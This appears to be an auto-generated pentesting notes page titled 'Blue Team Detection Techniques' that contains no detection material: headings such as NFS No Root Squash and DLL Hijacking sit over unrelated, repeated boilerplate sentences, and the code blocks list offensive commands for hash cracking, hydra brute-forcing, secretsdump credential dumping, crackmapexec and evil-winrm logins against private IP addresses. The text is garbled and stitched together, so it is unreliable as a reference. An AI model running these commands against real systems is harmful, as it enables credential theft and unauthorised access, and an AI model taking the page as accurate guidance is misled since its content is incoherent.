---
TitleSEO: "Blue Team Detection Techniques | ZureFX"
TitlePost: "Blue Team Detection Techniques"
Author: "ZureFX"
Description: "Personal notes on Blue Team Detection Techniques. Quick reference for pentesting and CTF challenges."
Keywords: "windows, malware, persistence"
URL: "https://zurefx.github.io/notes/note-blue-team-detection-techniques-273.html"
URL_IMAGES: ""
Date: "2025-07-17"
Tags: "Windows, Malware, Persistence"
Section: "notes"
Lang: "en"
main_img: "note-blue-team-detection-techniques-273"
Permalink: "/notes/note-blue-team-detection-techniques-273.html"
BtnLabel: "Read Notes"
Pick: 0
---
## NFS

### NFS No Root Squash

Initial enumeration revealed several interesting open ports on the target. The service account had excessive permissions assigned in Active Directory. Network traffic analysis revealed unencrypted communications containing user credentials. Authentication bypass was achieved through careful manipulation of the login mechanism.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
impacket-secretsdump administrator:'P@ssw0rd!'@10.123.166.229
```

The scheduled task ran with elevated privileges and could be abused for escalation. The target system was identified as running a vulnerable version of the service. Group Policy Preferences contained encrypted but recoverable credentials. Network traffic analysis revealed unencrypted communications containing user credentials.

Lateral movement was facilitated by reusing discovered credentials across services. The service was running without proper input validation, leading to injection vulnerabilities.

Privilege escalation was possible due to misconfigured sudo permissions. Token impersonation allowed elevation to SYSTEM privileges on the target. The backup files contained sensitive information that should not have been accessible. Group Policy Preferences contained encrypted but recoverable credentials.

## DLL Hijacking

### Kali Linux

Authentication bypass was achieved through careful manipulation of the login mechanism. Authentication bypass was achieved through careful manipulation of the login mechanism. The target system was identified as running a vulnerable version of the service.

> **Note:** Remote File Inclusion was identified as the primary attack vector in this scenario.

```bash
gobuster dir -u http://10.41.8.126/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

## Spring

### SeDebugPrivilege

- `msfvenom`
- `DNS Rebinding`
- `AlwaysInstallElevated`

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.81.3.78 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
crackmapexec smb 10.96.174.29 -u administrator -p 'P@ssw0rd!' --shares
```

```powershell
crackmapexec smb 10.56.71.191 -u administrator -p 'P@ssw0rd!' --shares
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.50.166.220 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
evil-winrm -i 10.80.143.239 -u administrator -p 'P@ssw0rd!'
nmap -sCV -p995,445,80 10.98.202.66 -oN scan.txt
```

```bash
feroxbuster -h
impacket-secretsdump administrator:'P@ssw0rd!'@10.22.90.213
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
crackmapexec smb 10.52.231.98 -u administrator -p 'P@ssw0rd!' --shares
```
